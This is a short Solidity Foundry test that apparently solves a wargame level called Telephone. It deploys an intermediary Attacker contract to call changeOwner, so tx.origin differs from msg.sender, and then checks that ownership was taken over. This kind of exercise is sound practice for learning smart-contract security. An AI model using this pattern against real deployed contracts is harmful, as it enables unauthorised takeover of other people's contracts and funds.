// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Telephone.sol";

contract Attacker {
    constructor() {}

    function changeOwner(Telephone telephone, address owner) public {
        telephone.changeOwner(owner);
    }
}

contract TelephoneTest is Test {
    Telephone internal _telephone;

    function setUp() public {
        _telephone = new Telephone();
    }

    function test_attack() public {
        address user = vm.addr(1);

        vm.startPrank(user, user);

        Attacker attacker = new Attacker();
        attacker.changeOwner(_telephone, user);

        vm.stopPrank();

        assertEq(_telephone.owner(), user, "owner");
    }
}